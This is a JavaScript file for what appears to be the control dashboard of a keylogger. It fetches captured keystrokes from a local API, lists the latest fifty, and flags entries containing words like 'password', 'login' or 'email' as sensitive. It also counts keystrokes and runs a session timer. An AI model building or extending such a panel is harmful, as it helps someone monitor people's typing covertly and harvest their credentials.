/**
 * Dashboard JavaScript - Real-time updates and interactions
 */

// Auto-refresh logs
let refreshInterval = setInterval(() => {
    fetch('/api/logs')
        .then(response => response.json())
        .then(data => {
            if (data.logs) {
                updateLogs(data.logs);
                updateStats(data.logs);
            }
        })
        .catch(console.error);
}, 5000);

function updateLogs(logs) {
    const tbody = document.getElementById('logs-body');
    if (!tbody) return;
    
    if (!logs || logs.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="3" style="text-align: center; padding: 40px; color: var(--text-muted);">
                    <i class="fas fa-inbox" style="font-size: 2rem; display: block; margin-bottom: 10px;"></i>
                    No keystrokes logged yet.
                </td>
            </tr>
        `;
        return;
    }
    
    const recent = logs.slice(-50).reverse();
    tbody.innerHTML = recent.map(log => {
        const timestamp = log.split('|')[0]?.trim() || '';
        const key = log.split('|')[1]?.trim() || log;
        const isSensitive = /password|username|email|login|pwd|pass/i.test(key);
        
        return `
            <tr>
                <td style="padding: 10px 12px; border-bottom: 1px solid var(--border-color);">${timestamp}</td>
                <td style="padding: 10px 12px; border-bottom: 1px solid var(--border-color);">
                    <span style="display: inline-block; padding: 2px 12px; background: var(--background-secondary); border-radius: 4px; font-family: monospace; font-weight: 600; ${isSensitive ? 'border: 1px solid var(--danger-color); color: var(--danger-color);' : ''}">
                        ${escapeHtml(key)}
                    </span>
                </td>
                <td style="padding: 10px 12px; border-bottom: 1px solid var(--border-color);">
                    <span style="padding: 2px 10px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; background: ${isSensitive ? 'rgba(248, 81, 73, 0.15)' : 'rgba(63, 185, 80, 0.15)'}; color: ${isSensitive ? 'var(--danger-color)' : 'var(--success-color)'};">
                        ${isSensitive ? ' Sensitive' : ' Normal'}
                    </span>
                </td>
            </tr>
        `;
    }).join('');
}

function updateStats(logs) {
    const element = document.getElementById('total-keystrokes');
    if (element && logs) {
        element.textContent = logs.length;
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Session timer
let seconds = 0;
setInterval(() => {
    seconds++;
    const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
    const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
    const s = String(seconds % 60).padStart(2, '0');
    const timer = document.getElementById('session-time');
    if (timer) timer.textContent = `${h}:${m}:${s}`;
}, 1000);

console.log(' Dashboard initialized');
            
  
            
    
